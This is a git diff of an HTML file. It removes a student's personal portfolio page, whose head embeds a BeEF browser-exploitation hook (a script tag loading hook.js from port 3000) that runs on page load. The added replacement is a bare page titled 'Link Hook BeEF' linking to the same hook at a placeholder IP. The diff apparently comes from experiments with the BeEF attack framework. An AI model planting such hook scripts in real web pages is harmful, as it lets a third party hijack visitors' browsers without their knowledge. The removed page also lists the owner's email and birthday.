@@ -1,149 +1,32 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" /
-    <script src="http://127.0.0.1:3000/hook.js"></script>
-    <title>Fzl Portfolio</title>
-
-    <link
-      rel="shortcut icon"
-      href="./assets/images/myavatar.jpeg"
-      type="images/x-icon"
-    />
-    <link rel="stylesheet" href="./assets/css/style.css" />
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link
-      href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap"
-      rel="stylesheet"
-    />
-
-  </head>
-  <body>
-    <main>
-      <aside class="sidebar" data-sidebar>
-        <div class="sidebar-info">
-          <figure class="avatar-box">
-            <img src="./assets/images/myavatar.jpeg" alt="Faizal" width="80" />
-          </figure>
-
-          <div class="info-content">
-            <h1 class="name" title="Faizal">Faizal</h1>
-            <p class="title">Wild & Free</p>
-          </div>
-
-          <button class="info_more-btn" data-sidebar-btn>
-            <span>Show Contacts</span>
-            <ion-icon name="chevron-down"></ion-icon>
-          </button>
-        </div>
-
-        <div class="sidebar-info_more">
-          <div class="separator"></div>
-          <ul class="contacts-list">
-            <li class="contact-item">
-              <div class="icon-box">
-                <ion-icon name="mail-outline"></ion-icon>
-              </div>
-              <div class="contact-info">
-                <p class="contact-title">Email</p>
-                <a href="mailto:dtmuhammadfaizal@gmail.com" class="contact-link"
-                  >dtmuhammadfaizal@gmail.com</a
-                >
-              </div>
-            </li>
-            <li class="contact-item">
-              <div class="icon-box">
-                <ion-icon name="calendar-outline"></ion-icon>
-              </div>
-              <div class="contact-info">
-                <p class="contact-title">Birthday</p>
-                <time datetime="2005-09-24">September 24</time>
-              </div>
-            </li>
-            <li class="contact-item">
-              <div class="icon-box">
-                <ion-icon name="location-outline"></ion-icon>
-              </div>
-              <div class="contact-info">
-                <p class="contact-title">Location</p>
-                <address>Indonesia</address>
-              </div>
-            </li>
-          </ul>
-          <div class="separator"></div>
-          <ul class="social-list">
-            <li class="social-item">
-              <a href="https://github.com/zxxxdmf/" class="social-link">
-                <ion-icon name="logo-github"></ion-icon>
-              </a>
-            </li>
-            <li class="social-item">
-              <a href="https://x.com/dmffzll" class="social-link">
-                <ion-icon name="logo-twitter"></ion-icon>
-              </a>
-            </li>
-            <li class="social-item">
-              <a
-                href="https://instagram.com/everlastingnothingnesss"
-                class="social-link"
-              >
-                <ion-icon name="logo-instagram"></ion-icon>
-              </a>
-            </li>
-        </div>
-      </aside>
-
-      <div class="main-content">
-        <!-- Navbar with only About section -->
-        <nav class="navbar">
-          <ul class="navbar-list">
-            <li class="navbar-item">
-              <button class="navbar-link active" data-nav-link>About</button>
-            </li>
-          </ul>
-        </nav>
-
-        <!-- About section -->
-        <article class="about active" data-page="about">
-          <header>
-            <h2 class="h2 article-title">About me</h2>
-          </header>
-          <section class="about-text">
-            <p>
-              Hello! My name is Datuk Muhammad Faizal, and I am a Computer
-              Science student at Universitas Muhammadiyah Kalimantan Timur. With
-              a passion for technology and a strong foundation in web
-              development, I am a skilled fullstack web developer, capable of
-              building both functional and visually appealing websites.
-              <br /><br />
-              In addition to my technical skills, I have a deep love for music.
-              I frequently enjoy listening to rock, pop, punk, and sometimes
-              even metal. This passion for music fuels my creativity and helps
-              me stay inspired, both in my personal projects and professional
-              work.
-            </p>
-          </section>
-          <footer>
-            <p>&copy; 2024 Datuk Muhammad Faizal. All rights reserved.</p>
-          </footer>
-        </article>
-      </div>
-    </main>
-
-    <!-- Custom JS Link -->
-    <script src="./assets/js/script.js"></script>
-
-    <!-- Ionicon Link -->
-    <script
-      type="module"
-      src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"
-    ></script>
-    <script
-      nomodule
-      src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"
-    ></script>
-  </body>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Link Hook BeEF</title>
+    <style>
+        .social-list {
+            list-style-type: none;
+            padding: 0;
+        }
+        .social-item {
+            margin: 10px 0;
+        }
+        .social-link {
+            text-decoration: none;
+            color: white;
+            background-color: #007bff;
+            padding: 10px 15px;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="separator"></div>
+    <ul class="social-list">
+        <li class="social-item">
+            <a href="http://<IP_Anda>:3000/hook.js" class="social-link" target="_blank">Kunjungi Hook BeEF</a>
+        </li>
+    </ul>
+</body>
 </html>
